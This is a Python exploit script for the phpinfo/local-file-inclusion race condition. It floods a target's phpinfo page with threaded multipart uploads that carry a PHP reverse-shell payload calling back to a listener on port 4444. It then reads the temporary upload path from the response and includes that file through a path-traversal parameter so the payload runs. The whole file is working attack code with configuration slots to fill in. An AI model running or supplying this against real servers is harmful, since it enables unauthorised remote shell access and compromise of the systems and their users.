import socket
import concurrent.futures

#################################################################
HOST = "192.168.1.78"       #Application IP/domain
PORT = "80"                 #Application PORT
token = "cookie"            #Session cookie (ie: "session=9284682879628476")
PADDING = "A"*1100          #Padding to slow down the server and exceed the buffer size (do not change if not sure)
MAX_WORKERS = 100            #Threads
PAYLOAD = """\r<?php $sock=fsockopen("<LISTENER-IP>",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>\r""" #Your PHP payload -- change the <LISTENER-IP> value
URL1 = "/phpinfo.php"           #Path to the phpinfo page
URL2 = "/lfiscript.php?page="   #Path to the LFI vulnerable page with the vulnerable parameter
#################################################################

def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(send_request) for _ in range(0, 30000)]

def send_request():
    global count
    count += 1
    if count % 100 == 0:
        print(f"Already {count} requests sent!")

    BOUNDARY1 = "---------------------------abc"
    BOUNDARY2 = "-----------------------------abc"

    data1 = (
    f"{BOUNDARY2}\r\n"
    f"Content-Disposition: form-data; name=\"poc\"; filename=\"poc.txt\"\r\n"
    f"Content-Type: text/plain\r\n\r\n"
    f"{PAYLOAD}\r\n"
    f"{BOUNDARY2}\r\n")

    headers1 = (
    f"POST {URL1}?a={PADDING} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Cookie: whatever={PADDING}\r\n"
    f"HTTP_ACCEPT: {PADDING}\r\n"
    f"HTTP_USER_AGENT: {PADDING}\r\n"
    f"HTTP_ACCEPT_LANGUAGE: {PADDING}\r\n"
    f"HTTP_PRAGMA: {PADDING}\r\n"
    f"Content-Type: multipart/form-data; boundary={BOUNDARY1}\r\n"
    f"Content-Length: {len(data1)}\r\n\r\n")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,8000))
    s2.connect((HOST,8000))

    s.sendall((headers1 + data1).encode())  #Sending the 1st request to upload the payload

    response = s.recv(81000)
    response_str = response.decode()        #Reading the server response

    i = response_str.find("/tmp/php")       #Finding the uploaded filename in the server response

    if i != -1:                             #If the file was uploaded, the server with answers with its path
        filename = response_str[i:i+14]     #Extracting the uploaded filename
        headers2 = (
        f"GET {URL2}../../../../../../../../../../..{filename} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Cookie: {token}\r\n"
        "Proxy-Connection: Keep-Alive\r\n\r\n")

        s2.sendall(headers2.encode())       #Sending the 2nd request (LFI to execute the uploaded file)
        response2 = s2.recv(4096)           
        s.close()
        s2.close()
    else:
        pass

if __name__ == '__main__':
    count = 0
    main()

